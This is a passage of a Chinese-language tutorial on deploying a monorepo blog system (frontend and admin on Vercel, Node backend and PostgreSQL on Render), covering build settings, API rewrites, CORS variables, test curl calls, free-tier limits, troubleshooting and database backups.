<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入 PostgreSQL（如果需要）</span>
psql <span class="hljs-variable">$DATABASE_URL</span>

<span class="hljs-comment"># 查看所有表</span>
\dt

<span class="hljs-comment"># 查看分类</span>
SELECT * FROM categories;

<span class="hljs-comment"># 查看管理员</span>
SELECT username, email FROM admin_users;

<span class="hljs-comment"># 退出</span>
\q
</code></pre>
<p>应该看到：</p>
<ul>
<li>4 张表：<code>admin_users</code>, <code>categories</code>, <code>articles</code>, <code>images</code></li>
<li>8 个分类（前端开发、后端开发等）</li>
<li>1 个管理员账号</li>
</ul>
<hr/>
<h2 data-id="heading-23">5. 第三步：部署前端到 Vercel</h2>
<h3 data-id="heading-24">5.1 导入项目</h3>
<ol>
<li>
<p>登录 <a href="https://link.juejin.cn?target=https%3A%2F%2Fvercel.com%2Fdashboard" target="_blank" title="https://vercel.com/dashboard" ref="nofollow noopener noreferrer">Vercel Dashboard</a></p>
</li>
<li>
<p>点击 <strong>"Add New..." → "Project"</strong></p>
</li>
<li>
<p>选择你的 GitHub 仓库 <code>blog</code></p>
</li>
<li>
<p>点击 <strong>"Import"</strong></p>
</li>
</ol>
<h3 data-id="heading-25">5.2 配置项目（blog-frontend）</h3>
<p>Vercel 会自动检测到 Monorepo 结构，现在配置前端：</p>








































<table><thead><tr><th>字段</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td><strong>Project Name</strong></td><td><code>blog-frontend</code>（可自定义）</td><td>项目名称</td></tr><tr><td><strong>Framework Preset</strong></td><td><strong>Other</strong></td><td>不使用预设</td></tr><tr><td><strong>Root Directory</strong></td><td><code>packages/blog-frontend</code></td><td>⚠️ <strong>重要</strong>：点击 "Edit" 修改</td></tr><tr><td><strong>Build Command</strong></td><td><code>npm install &amp;&amp; cd packages/blog-frontend &amp;&amp; npm run build</code></td><td>⚠️ Monorepo 构建命令</td></tr><tr><td><strong>Output Directory</strong></td><td><code>../../dist/packages/blog-frontend</code></td><td>构建输出目录</td></tr><tr><td><strong>Install Command</strong></td><td><code>npm install --prefix ../.. &amp;&amp; npm install</code></td><td>安装依赖</td></tr></tbody></table>
<h4 data-id="heading-26">配置截图说明位置</h4>
<p><strong>Root Directory 配置</strong>：</p>
<ol>
<li>在 "Build and Output Settings" 下找到 "Root Directory"</li>
<li>点击 "Edit" 按钮</li>
<li>选择 <code>packages/blog-frontend</code></li>
</ol>
<p><strong>Build Command 配置</strong>：</p>
<ol>
<li>勾选 "Override" 复选框</li>
<li>输入完整的 Monorepo 构建命令</li>
</ol>
<h3 data-id="heading-27">5.3 配置 API 重写（重要）</h3>
<p>⚠️ <strong>Vercel 项目配置会读取 <code>vercel.json</code></strong>，但我们手动确认一下：</p>
<ol>
<li>在部署前，确认项目根目录的 <code>packages/blog-frontend/vercel.json</code> 包含：</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"rewrites"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/api/:path*"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"destination"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://blog-server-xxxx.onrender.com/api/:path*"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/(.*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"destination"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/index.html"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="2">
<li>
<p><strong>⚠️ 重要</strong>：将 <code>https://blog-server-xxxx.onrender.com</code> 替换为你在步骤 3.5 获取的实际 Render URL</p>
</li>
<li>
<p>如果已修改，提交代码：</p>
</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git add packages/blog-frontend/vercel.json
git commit -m <span class="hljs-string">"fix: update API URL in vercel.json"</span>
git push origin main
</code></pre>
<h3 data-id="heading-28">5.4 部署</h3>
<ol>
<li>
<p>配置完成后，点击 <strong>"Deploy"</strong></p>
</li>
<li>
<p>⏳ 构建时间：约 2-3 分钟</p>
</li>
<li>
<p>成功后会显示：</p>
<pre><code class="hljs">✅ Deployment Ready
</code></pre>
</li>
<li>
<p>点击 <strong>"Visit"</strong> 或复制部署 URL（例如：<code>https://blog-frontend-xxxx.vercel.app</code>）</p>
</li>
<li>
<p><strong>保存前端 URL</strong>，稍后需要更新 Render 的 CORS 配置</p>
</li>
</ol>
<h3 data-id="heading-29">5.5 验证前端部署</h3>
<p>访问前端 URL，应该看到：</p>
<ul>
<li>✅ 博客首页加载正常</li>
<li>✅ 分类列表显示（从 Render API 获取）</li>
<li>⚠️ 可能显示 "暂无文章"（正常，因为还没创建文章）</li>
</ul>
<hr/>
<h2 data-id="heading-30">6. 第四步：部署后台管理到 Vercel</h2>
<h3 data-id="heading-31">6.1 部署流程</h3>
<p>与前端类似，重复步骤 5，但使用不同的配置：</p>
<ol>
<li>
<p>在 Vercel Dashboard，点击 <strong>"Add New..." → "Project"</strong></p>
</li>
<li>
<p>再次选择 <code>blog</code> 仓库</p>
</li>
<li>
<p>Vercel 会提示 "This repository is already connected"，选择 <strong>"Import Anyway"</strong></p>
</li>
<li>
<p>配置项目：</p>
</li>
</ol>

































<table><thead><tr><th>字段</th><th>值</th></tr></thead><tbody><tr><td><strong>Project Name</strong></td><td><code>blog-admin</code></td></tr><tr><td><strong>Framework Preset</strong></td><td><strong>Other</strong></td></tr><tr><td><strong>Root Directory</strong></td><td><code>packages/blog-admin</code></td></tr><tr><td><strong>Build Command</strong></td><td><code>npm install &amp;&amp; cd packages/blog-admin &amp;&amp; npm run build</code></td></tr><tr><td><strong>Output Directory</strong></td><td><code>../../dist/packages/blog-admin</code></td></tr><tr><td><strong>Install Command</strong></td><td><code>npm install --prefix ../.. &amp;&amp; npm install</code></td></tr></tbody></table>
<ol start="5">
<li>
<p>确认 <code>packages/blog-admin/vercel.json</code> 中的 API URL 与前端一致</p>
</li>
<li>
<p>点击 <strong>"Deploy"</strong></p>
</li>
<li>
<p>获取后台 URL（例如：<code>https://blog-admin-xxxx.vercel.app</code>）</p>
</li>
</ol>
<h3 data-id="heading-32">6.2 验证后台部署</h3>
<p>访问后台 URL，应该看到：</p>
<ul>
<li>✅ 登录页面加载正常</li>
<li>⚠️ 先不要登录（CORS 还未配置）</li>
</ul>
<hr/>
<h2 data-id="heading-33">7. 第五步：连接前后端</h2>
<h3 data-id="heading-34">7.1 更新 Render 的 CORS 配置</h3>
<p>现在我们有了前端和后台的 URL，需要更新 Render 环境变量：</p>
<ol>
<li>
<p>回到 Render Dashboard → <code>blog-server</code> 服务</p>
</li>
<li>
<p>进入 <strong>"Environment"</strong> 标签</p>
</li>
<li>
<p>更新以下变量：</p>
<pre><code class="hljs language-bash" lang="bash">FRONTEND_URL=https://blog-frontend-xxxx.vercel.app
</code></pre>
<pre><code class="hljs language-bash" lang="bash">ADMIN_URL=https://blog-admin-xxxx.vercel.app
</code></pre>
<p><strong>替换为你实际的 Vercel URL</strong></p>
</li>
<li>
<p>点击 <strong>"Save Changes"</strong></p>
</li>
<li>
<p>Render 会自动重启服务（约 1 分钟）</p>
</li>
</ol>
<h3 data-id="heading-35">7.2 测试 API 连接</h3>
<ol>
<li>
<p>打开浏览器控制台（F12）</p>
</li>
<li>
<p>访问前端 URL：<code>https://blog-frontend-xxxx.vercel.app</code></p>
</li>
<li>
<p>在 Network 标签查看 API 请求：</p>
<ul>
<li>✅ 应该看到 <code>/api/categories</code> 请求成功</li>
<li>✅ 响应头包含 <code>Access-Control-Allow-Origin</code></li>
</ul>
</li>
<li>
<p>如果看到 CORS 错误，检查：</p>
<ul>
<li>Render 环境变量是否正确</li>
<li>服务是否已重启</li>
<li>URL 是否包含 <code>https://</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-36">7.3 验证登录功能</h3>
<ol>
<li>
<p>访问后台 URL：<code>https://blog-admin-xxxx.vercel.app</code></p>
</li>
<li>
<p>使用默认账号登录：</p>
<ul>
<li><strong>用户名</strong>：<code>admin</code></li>
<li><strong>密码</strong>：<code>admin123</code></li>
</ul>
</li>
<li>
<p>登录成功后，应该进入 Dashboard</p>
</li>
<li>
<p>查看：</p>
<ul>
<li>✅ 分类列表显示</li>
<li>✅ 文章列表为空（正常）</li>
<li>✅ 可以创建新文章</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-37">8. 第六步：验证部署</h2>
<h3 data-id="heading-38">8.1 测试前端访问</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 替换为你的前端 URL</span>
FRONTEND_URL=<span class="hljs-string">"https://blog-frontend-xxxx.vercel.app"</span>

<span class="hljs-comment"># 测试首页</span>
curl -I <span class="hljs-variable">$FRONTEND_URL</span>
<span class="hljs-comment"># 应该返回 200 OK</span>

<span class="hljs-comment"># 测试 API 代理</span>
curl <span class="hljs-variable">$FRONTEND_URL</span>/api/categories
<span class="hljs-comment"># 应该返回 JSON 分类列表</span>
</code></pre>
<h3 data-id="heading-39">8.2 测试后台登录</h3>
<ol>
<li>
<p>打开浏览器控制台</p>
</li>
<li>
<p>访问 <code>https://blog-admin-xxxx.vercel.app</code></p>
</li>
<li>
<p>输入账号密码，点击登录</p>
</li>
<li>
<p>在 Network 标签查看：</p>
<ul>
<li>✅ <code>/api/auth/login</code> 请求成功（200）</li>
<li>✅ 返回 <code>token</code> 和用户信息</li>
<li>✅ 自动跳转到 Dashboard</li>
</ul>
</li>
</ol>
<h3 data-id="heading-40">8.3 测试 API 调用</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 替换为你的后端 URL</span>
API_URL=<span class="hljs-string">"https://blog-server-xxxx.onrender.com"</span>

<span class="hljs-comment"># 测试健康检查</span>
curl <span class="hljs-variable">$API_URL</span>/api/health
<span class="hljs-comment"># 返回: {"status":"ok","timestamp":"..."}</span>

<span class="hljs-comment"># 测试获取分类</span>
curl <span class="hljs-variable">$API_URL</span>/api/categories
<span class="hljs-comment"># 返回: {"code":0,"message":"success","data":[...]}</span>

<span class="hljs-comment"># 测试登录</span>
curl -X POST <span class="hljs-variable">$API_URL</span>/api/auth/login \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{"username":"admin","password":"admin123"}'</span>
<span class="hljs-comment"># 返回: {"code":0,"message":"Login successful","data":{"token":"...","user":{...}}}</span>
</code></pre>
<h3 data-id="heading-41">8.4 测试图片上传</h3>
<ol>
<li>
<p>登录后台管理</p>
</li>
<li>
<p>进入 "文章管理" → "创建文章"</p>
</li>
<li>
<p>点击上传封面图片</p>
</li>
<li>
<p>选择一张图片（&lt;5MB）</p>
</li>
<li>
<p>确认：</p>
<ul>
<li>✅ 上传成功</li>
<li>✅ 图片预览显示</li>
<li>✅ 发布文章后，前端可以看到图片</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-42">9. Monorepo 特殊配置说明</h2>
<h3 data-id="heading-43">9.1 为什么需要特殊的构建命令？</h3>
<p>项目使用 Nx Monorepo，所有 packages 共享根目录的 <code>node_modules</code>：</p>
<pre><code class="hljs language-bash" lang="bash">blog/
├── node_modules/           <span class="hljs-comment"># 根依赖</span>
├── packages/
│   ├── blog-frontend/
│   │   ├── node_modules/   <span class="hljs-comment"># 子项目依赖</span>
│   │   └── package.json
│   └── blog-server/
│       └── ...
└── package.json            <span class="hljs-comment"># 根 package.json</span>
</code></pre>
<h3 data-id="heading-44">9.2 Vercel 构建命令解析</h3>
<p><strong>标准命令</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">npm install &amp;&amp; <span class="hljs-built_in">cd</span> packages/blog-frontend &amp;&amp; npm run build
</code></pre>
<p><strong>分解</strong>：</p>
<ol>
<li><code>npm install</code> - 安装根依赖（Nx, TypeScript 等）</li>
<li><code>cd packages/blog-frontend</code> - 进入前端目录</li>
<li><code>npm run build</code> - 构建前端（Rsbuild）</li>
</ol>
<h3 data-id="heading-45">9.3 输出目录配置</h3>
<p><strong>为什么是 <code>../../dist/packages/blog-frontend</code>？</strong></p>
<ul>
<li>Vercel 从 <code>packages/blog-frontend</code> 目录开始</li>
<li>输出到 <code>../../dist/packages/blog-frontend</code>（相对于当前目录）</li>
<li>实际路径：<code>blog/dist/packages/blog-frontend</code></li>
</ul>
<p><strong>rsbuild.config.ts 配置</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">output</span>: {
  <span class="hljs-attr">distPath</span>: {
    <span class="hljs-attr">root</span>: <span class="hljs-string">'../../dist/packages/blog-frontend'</span>
  }
}
</code></pre>
<h3 data-id="heading-46">9.4 API 代理重写机制</h3>
<p><strong>vercel.json 配置</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"rewrites"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/api/:path*"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"destination"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://blog-2eqo.onrender.com/api/:path*"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>工作原理</strong>：</p>
<ol>
<li>前端发起请求：<code>/api/articles</code></li>
<li>Vercel 拦截请求，重写为：<code>https://blog-2eqo.onrender.com/api/articles</code></li>
<li>转发到 Render 后端</li>
<li>返回响应给前端</li>
</ol>
<p><strong>优点</strong>：</p>
<ul>
<li>✅ 前端无需关心 API 域名</li>
<li>✅ 避免 CORS 问题（同域请求）</li>
<li>✅ 简化环境变量管理</li>
</ul>
<hr/>
<h2 data-id="heading-47">10. 环境变量完整清单</h2>
<h3 data-id="heading-48">10.1 Render 环境变量（blog-server）</h3>






































































<table><thead><tr><th>变量名</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td><code>NODE_ENV</code></td><td><code>production</code></td><td>生产环境标识</td></tr><tr><td><code>JWT_SECRET</code></td><td><code>&lt;随机 64 位字符串&gt;</code></td><td>JWT 签名密钥（必须修改）</td></tr><tr><td><code>JWT_EXPIRES_IN</code></td><td><code>7d</code></td><td>Token 过期时间</td></tr><tr><td><code>FRONTEND_URL</code></td><td><code>https://blog-frontend-xxxx.vercel.app</code></td><td>前端 URL（CORS）</td></tr><tr><td><code>ADMIN_URL</code></td><td><code>https://blog-admin-xxxx.vercel.app</code></td><td>后台 URL（CORS）</td></tr><tr><td><code>DB_HOST</code></td><td><code>&lt;Render 数据库 Hostname&gt;</code></td><td>数据库主机</td></tr><tr><td><code>DB_PORT</code></td><td><code>5432</code></td><td>数据库端口</td></tr><tr><td><code>DB_USER</code></td><td><code>&lt;Render 数据库 Username&gt;</code></td><td>数据库用户</td></tr><tr><td><code>DB_PASSWORD</code></td><td><code>&lt;Render 数据库 Password&gt;</code></td><td>数据库密码</td></tr><tr><td><code>DB_NAME</code></td><td><code>blog_system</code></td><td>数据库名称</td></tr><tr><td><code>MAX_FILE_SIZE</code></td><td><code>5242880</code></td><td>最大文件大小（5MB）</td></tr><tr><td><code>ALLOWED_IMAGE_TYPES</code></td><td><code>image/jpeg,image/png,image/gif,image/webp</code></td><td>允许的图片类型</td></tr></tbody></table>
<h3 data-id="heading-49">10.2 Vercel 环境变量（可选）</h3>
<p><strong>blog-frontend 和 blog-admin</strong>：</p>















<table><thead><tr><th>变量名</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td><code>VITE_API_BASE_URL</code></td><td><code>&lt;Render API URL&gt;/api</code></td><td>API 基础 URL（可选）</td></tr></tbody></table>
<blockquote>
<p><strong>注意</strong>：由于使用了 <code>vercel.json</code> 的 <code>rewrites</code>，前端可以直接用 <code>/api</code> 请求，无需配置环境变量。</p>
</blockquote>
<h3 data-id="heading-50">10.3 安全性建议</h3>
<h4 data-id="heading-51">生成安全的 JWT_SECRET</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方法 1：Node.js</span>
node -e <span class="hljs-string">"console.log(require('crypto').randomBytes(32).toString('hex'))"</span>

<span class="hljs-comment"># 方法 2：OpenSSL</span>
openssl rand -hex 32

<span class="hljs-comment"># 方法 3：在线工具</span>
<span class="hljs-comment"># https://www.uuidgenerator.net/</span>
</code></pre>
<h4 data-id="heading-52">环境变量管理</h4>
<ul>
<li>⚠️ <strong>永远不要</strong>把 <code>.env</code> 提交到 Git</li>
<li>✅ 使用 <code>.env.example</code> 作为模板</li>
<li>✅ 生产环境的密钥与开发环境不同</li>
<li>✅ 定期轮换 JWT_SECRET（需要用户重新登录）</li>
</ul>
<hr/>
<h2 data-id="heading-53">11. 免费额度说明</h2>
<h3 data-id="heading-54">11.1 Vercel 免费计划</h3>








































<table><thead><tr><th>项目</th><th>额度</th><th>说明</th></tr></thead><tbody><tr><td><strong>带宽</strong></td><td>100 GB/月</td><td>足够个人博客使用</td></tr><tr><td><strong>构建执行时间</strong></td><td>100 GB-小时/月</td><td>约 100 次构建</td></tr><tr><td><strong>部署数量</strong></td><td>无限</td><td>每次 push 都会部署</td></tr><tr><td><strong>项目数量</strong></td><td>无限</td><td>可以部署多个项目</td></tr><tr><td><strong>团队成员</strong></td><td>1 人</td><td>免费计划仅支持个人</td></tr><tr><td><strong>域名</strong></td><td>自定义域名</td><td>支持绑定自己的域名</td></tr></tbody></table>
<p><strong>限制</strong>：</p>
<ul>
<li>每次构建最多 45 分钟</li>
<li>无服务器函数最多运行 10 秒</li>
<li>环境变量最多 4KB</li>
</ul>
<p><strong>足够用于</strong>：</p>
<ul>
<li>✅ 个人博客</li>
<li>✅ 小型项目展示</li>
<li>✅ 前端应用</li>
<li>⚠️ 不适合高流量商业网站</li>
</ul>
<h3 data-id="heading-55">11.2 Render 免费计划</h3>








































<table><thead><tr><th>项目</th><th>额度</th><th>说明</th></tr></thead><tbody><tr><td><strong>运行时间</strong></td><td>750 小时/月</td><td>约 31 天，够用一整月</td></tr><tr><td><strong>内存</strong></td><td>512 MB</td><td>足够 Node.js 应用</td></tr><tr><td><strong>CPU</strong></td><td>共享</td><td>性能受限，但可接受</td></tr><tr><td><strong>带宽</strong></td><td>100 GB/月</td><td>出站流量限制</td></tr><tr><td><strong>构建时间</strong></td><td>每次 500 秒</td><td>足够 npm install + build</td></tr><tr><td><strong>PostgreSQL</strong></td><td>256 MB 存储</td><td>约可存储 10000+ 篇文章</td></tr></tbody></table>
<p><strong>重要限制</strong>：</p>
<ul>
<li>⚠️ <strong>服务会在 15 分钟无活动后休眠</strong></li>
<li>⚠️ <strong>从休眠唤醒需要 30-50 秒</strong>（首次访问慢）</li>
<li>⚠️ PostgreSQL 数据库 90 天未访问会被删除</li>
<li>✅ 数据库不会休眠（始终在线）</li>
</ul>
<p><strong>足够用于</strong>：</p>
<ul>
<li>✅ 个人博客后端</li>
<li>✅ API 服务</li>
<li>✅ 小型全栈应用</li>
<li>⚠️ 不适合需要即时响应的应用</li>
</ul>
<h3 data-id="heading-56">11.3 如何应对 Render 休眠？</h3>
<p><strong>方法 1：使用 UptimeRobot（推荐）</strong></p>
<ol>
<li>注册 <a href="https://link.juejin.cn?target=https%3A%2F%2Fuptimerobot.com" target="_blank" title="https://uptimerobot.com" ref="nofollow noopener noreferrer">uptimerobot.com</a>（免费）</li>
<li>添加 Monitor：
<ul>
<li><strong>Monitor Type</strong>: HTTP(s)</li>
<li><strong>URL</strong>: <code>https://blog-server-xxxx.onrender.com/api/health</code></li>
<li><strong>Monitoring Interval</strong>: 5 分钟</li>
</ul>
</li>
<li>UptimeRobot 会每 5 分钟 ping 一次，保持服务唤醒</li>
</ol>
<p><strong>方法 2：使用 Cron-job.org</strong></p>
<ol>
<li>注册 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcron-job.org" target="_blank" title="https://cron-job.org" ref="nofollow noopener noreferrer">cron-job.org</a></li>
<li>创建定时任务：
<ul>
<li><strong>URL</strong>: <code>https://blog-server-xxxx.onrender.com/api/health</code></li>
<li><strong>Execution</strong>: 每 10 分钟</li>
</ul>
</li>
</ol>
<p><strong>方法 3：前端定时请求（不推荐）</strong></p>
<p>在前端添加定时器：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不推荐：消耗用户带宽</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/health'</span>)
}, <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>) <span class="hljs-comment">// 每 5 分钟</span>
</code></pre>
<hr/>
<h2 data-id="heading-57">12. 常见问题排查</h2>
<h3 data-id="heading-58">12.1 API 502/504 错误</h3>
<p><strong>症状</strong>：前端显示 "网络错误" 或 "502 Bad Gateway"</p>
<p><strong>原因</strong>：Render 服务休眠，正在唤醒</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p>等待 30-50 秒，刷新页面</p>
</li>
<li>
<p>如果仍然失败，检查 Render 服务状态：</p>
<ul>
<li>进入 Render Dashboard → <code>blog-server</code></li>
<li>查看 "Logs" 是否有错误</li>
<li>确认服务状态为 "Live"</li>
</ul>
</li>
<li>
<p>如果服务启动失败，检查：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 Render Shell 中</span>
node dist/server.js
<span class="hljs-comment"># 查看错误信息</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-59">12.2 CORS 错误</h3>
<p><strong>症状</strong>：浏览器控制台显示：</p>
<pre><code class="hljs language-rust" lang="rust">Access to fetch at <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//blog-xxxx.onrender.com/api/...'</span>
from origin <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//blog-frontend-xxxx.vercel.app' has been blocked by CORS policy</span>
</code></pre>
<p><strong>原因</strong>：Render 环境变量中的 <code>FRONTEND_URL</code> 或 <code>ADMIN_URL</code> 不正确</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p>检查 Render 环境变量：</p>
<ul>
<li><code>FRONTEND_URL</code> 必须与 Vercel 前端 URL 完全一致</li>
<li>包含 <code>https://</code></li>
<li>不包含尾部斜杠 <code>/</code></li>
</ul>
</li>
<li>
<p>确认 CORS 配置（<code>packages/blog-server/src/middleware/cors.ts</code>）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">origin</span>: [
  env.<span class="hljs-property">FRONTEND_URL</span>,  <span class="hljs-comment">// 前端 URL</span>
  env.<span class="hljs-property">ADMIN_URL</span>      <span class="hljs-comment">// 后台 URL</span>
]
</code></pre>
</li>
<li>
<p>重启 Render 服务（修改环境变量后自动重启）</p>
</li>
</ol>
<h3 data-id="heading-60">12.3 Vercel 构建失败</h3>
<p><strong>症状</strong>：Vercel 部署失败，显示 "Build failed"</p>
<p><strong>常见错误 1：找不到模块</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Error: Cannot find <span class="hljs-keyword">module</span> <span class="hljs-string">'react'</span>
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>检查 Build Command 是否包含 <code>npm install</code></li>
<li>确认 Root Directory 配置正确</li>
</ul>
<p><strong>常见错误 2：输出目录为空</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Error</span>: <span class="hljs-title class_">No</span> <span class="hljs-title class_">Output</span> <span class="hljs-title class_">Directory</span> named <span class="hljs-string">"dist"</span> found after the build
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>检查 Output Directory 配置：<code>../../dist/packages/blog-frontend</code></li>
<li>本地运行 <code>npm run build</code> 确认输出目录正确</li>
</ul>
<p><strong>常见错误 3：构建超时</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">Error: Command timed <span class="hljs-keyword">out</span> after <span class="hljs-number">45</span> minutes
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>检查 <code>package.json</code> 是否有重复依赖</li>
<li>使用 <code>npm ci</code> 代替 <code>npm install</code>（更快）</li>
</ul>
<h3 data-id="heading-61">12.4 数据库连接失败</h3>
<p><strong>症状</strong>：Render 日志显示：</p>
<pre><code class="hljs language-arduino" lang="arduino">Error: connect ETIMEDOUT
</code></pre>
<p><strong>原因</strong>：数据库环境变量配置错误</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p>检查 Render 环境变量：</p>
<ul>
<li><code>DB_HOST</code>、<code>DB_PORT</code>、<code>DB_USER</code>、<code>DB_PASSWORD</code>、<code>DB_NAME</code></li>
<li>与数据库 "Info" 标签的信息一致</li>
</ul>
</li>
<li>
<p>确认数据库状态为 "Available"</p>
</li>
<li>
<p>测试连接（在 Render Shell）：</p>
<pre><code class="hljs language-bash" lang="bash">psql <span class="hljs-variable">$DATABASE_URL</span> -c <span class="hljs-string">"SELECT 1"</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-62">12.5 图片显示 404</h3>
<p><strong>症状</strong>：前端文章列表或详情页，封面图片显示 404</p>
<p><strong>原因</strong>：数据库未初始化，或图片未上传</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p>确认数据库已初始化：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 Render Shell</span>
psql <span class="hljs-variable">$DATABASE_URL</span> -c <span class="hljs-string">"SELECT COUNT(*) FROM images"</span>
</code></pre>
</li>
<li>
<p>如果表不存在，运行：</p>
<pre><code class="hljs language-bash" lang="bash">npm run db:init
</code></pre>
</li>
<li>
<p>上传测试图片：</p>
<ul>
<li>登录后台管理</li>
<li>创建文章并上传封面</li>
</ul>
</li>
</ol>
<h3 data-id="heading-63">12.6 登录失败</h3>
<p><strong>症状</strong>：输入账号密码后，提示 "用户名或密码错误"</p>
<p><strong>原因</strong>：管理员账号未创建</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p>检查数据库中的管理员：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 Render Shell</span>
psql <span class="hljs-variable">$DATABASE_URL</span> -c <span class="hljs-string">"SELECT username, email FROM admin_users"</span>
</code></pre>
</li>
<li>
<p>如果为空，重新初始化：</p>
<pre><code class="hljs language-bash" lang="bash">npm run db:init
</code></pre>
</li>
<li>
<p>或手动创建管理员：</p>
<pre><code class="hljs language-bash" lang="bash">npm run create-admin
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-64">13. 优化建议</h2>
<h3 data-id="heading-65">13.1 防止 Render 休眠</h3>
<p>使用 <strong>UptimeRobot</strong> 定期 ping API（推荐）：</p>
<ol>
<li>注册 <a href="https://link.juejin.cn?target=https%3A%2F%2Fuptimerobot.com" target="_blank" title="https://uptimerobot.com" ref="nofollow noopener noreferrer">uptimerobot.com</a></li>
<li>添加 HTTP Monitor</li>
<li>URL: <code>https://blog-server-xxxx.onrender.com/api/health</code></li>
<li>间隔: 5 分钟</li>
</ol>
<p><strong>效果</strong>：</p>
<ul>
<li>✅ 服务始终保持活跃</li>
<li>✅ 用户访问无需等待唤醒</li>
<li>✅ 免费，无需额外成本</li>
</ul>
<h3 data-id="heading-66">13.2 图片优化</h3>
<p><strong>问题</strong>：图片存储在数据库中，占用空间且加载慢</p>
<p><strong>优化方案</strong>：</p>
<ol>
<li>
<p><strong>压缩图片</strong>（前端上传前）</p>
<ul>
<li>使用 <code>browser-image-compression</code> 库</li>
<li>限制宽度 1200px，质量 80%</li>
</ul>
</li>
<li>
<p><strong>迁移到对象存储</strong>（推荐）</p>
<ul>
<li>使用 Cloudflare R2（免费 10GB）</li>
<li>或 AWS S3 + CloudFront</li>
<li>数据库只存储 URL</li>
</ul>
</li>
<li>
<p><strong>添加图片缓存</strong></p>
<ul>
<li>Vercel 自动缓存静态资源</li>
<li>后端添加 <code>Cache-Control</code> 头</li>
</ul>
</li>
</ol>
<h3 data-id="heading-67">13.3 性能监控</h3>
<p><strong>Vercel Analytics（免费）</strong>：</p>
<ol>
<li>进入 Vercel 项目 → <strong>"Analytics"</strong></li>
<li>启用 Web Analytics</li>
<li>查看：
<ul>
<li>页面加载时间</li>
<li>用户访问量</li>
<li>地理分布</li>
</ul>
</li>
</ol>
<p><strong>Render Metrics（免费）</strong>：</p>
<ol>
<li>进入 Render 服务 → <strong>"Metrics"</strong></li>
<li>查看：
<ul>
<li>CPU 使用率</li>
<li>内存使用率</li>
<li>HTTP 请求量</li>
</ul>
</li>
</ol>
<h3 data-id="heading-68">13.4 数据库备份</h3>
<p><strong>Render 免费计划不提供自动备份</strong>，建议手动备份：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 本地备份</span>
pg_dump <span class="hljs-string">"&lt;External Database URL&gt;"</span> &gt; backup.sql

<span class="hljs-comment"># 恢复</span>
psql <span class="hljs-string">"&lt;External Database URL&gt;"</span> &lt; backup.sql
</code></pre>
<p><strong>定期备份</strong>：</p>
<ul>
<li>每周备份一次</li>
<li>存储在 GitHub（加密）或 Google Drive</li>
</ul>
<h3 data-id="heading-69">13.5 日志管理</h3>
<p><strong>Winston 日志配置</strong>（已集成）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/blog-server/src/config/logger.ts</span>
